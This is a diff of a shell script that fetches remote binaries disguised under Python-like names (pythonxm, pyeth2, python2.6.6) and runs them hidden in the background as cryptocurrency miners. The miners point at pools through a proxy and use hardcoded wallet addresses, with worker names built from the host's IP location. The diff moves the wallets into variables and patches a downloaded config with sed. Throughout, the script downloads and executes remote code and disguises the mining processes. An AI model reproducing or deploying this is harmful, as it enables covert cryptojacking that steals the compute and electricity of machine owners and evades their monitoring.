@@ -13,6 +13,14 @@ XMThreads=$[$(nproc)*1]
 
 Debug=False
 
+#Keys
+W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
+W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
+W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
+W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+
+#
+
 ## getting IP info
 
 JSINFO=$(curl ipinfo.io)
@@ -23,7 +31,7 @@ IPORG=$(echo $JSINFO|grep -oP '(?<="org": ")[^"]*')
 IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
 #IPNAME=$(sed 's|\.|o|g' <<< $IIP)
 IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
-INFO="$COUNTRY""_""$REGION""_""$IPNAME"
+INFO="$REGION""_""$IPNAME"
 LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
 #echo $JSINFO
 echo "let's name it: $INFO"
@@ -217,7 +225,8 @@ chmod +x pythonxm
 #                Config
 wget -q https://github.com/one10001/10001code/raw/main/config.json
 sed -i "s+ip0001+RV_$IPNAME+g" config.json
-sed -i "s+xxpppxx+$PROX+g" config.json
+sed -i "s+78.47.69.185+$PROX+g" config.json
+sed -i "s+44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p+$W_XM+g" config.json
 
 nohup ./pythonxm -c config.json -l ooutxm 2>> ooutxm 1>> ooutxm &
 
@@ -228,7 +237,7 @@ rm -rf pythonheq
 wget -q https://github.com/one10001/10001code/raw/main/pythonheq
 chmod +x pythonheq
 
-nohup ./pythonheq -v -l "$PROX":"$VCPort" -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
+nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t 4 1>> ooutvc 2>> ooutvc &
 
 fi
 
@@ -239,9 +248,9 @@ then
     chmod +x pyeth2
     if  [ $PROG == "CU" ]
     then
-        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -U 2>> oout 1>> oout &
     else
-        nohup  ./pyeth2  -P stratum+tcp://0x1be9C1Db52aC9cD736160c532D69aA4770c327B7."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
+        nohup  ./pyeth2  -P stratum+tcp://"$W_ET"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$ETPort  -G 2>> oout 1>> oout &
     fi
 
 elif [ $OPG == "RV" ]
@@ -251,9 +260,9 @@ then
     chmod +x python2.6.6
     if  [ $PROG == "CU" ]
     then
-    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -U 2>> oout 1>> oout &
     else
-    nohup  ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
+    nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
     fi
 else
     echo "No GPU"
@@ -263,7 +272,7 @@ fi
 ##################################################################
 ########                Display                          #########     
 ##################################################################
-
+OP=RV
 
 while true
     do
